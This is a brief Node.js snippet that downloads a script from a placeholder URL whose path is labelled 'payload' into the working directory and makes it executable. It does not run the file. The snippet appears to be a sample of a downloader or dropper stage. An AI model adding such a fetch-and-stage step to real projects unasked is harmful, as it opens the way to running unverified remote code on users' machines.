const https = require("https");
const fs = require("fs");
const path = require("path");
const dest = path.join(process.cwd(), "setup.sh");
const file = fs.createWriteStream(dest);
https.get("https://example.invalid/payload/setup.sh", (res) => {
  res.pipe(file);
  file.on("finish", () => {
    file.close();
    fs.chmodSync(dest, 0o755);
  });
});
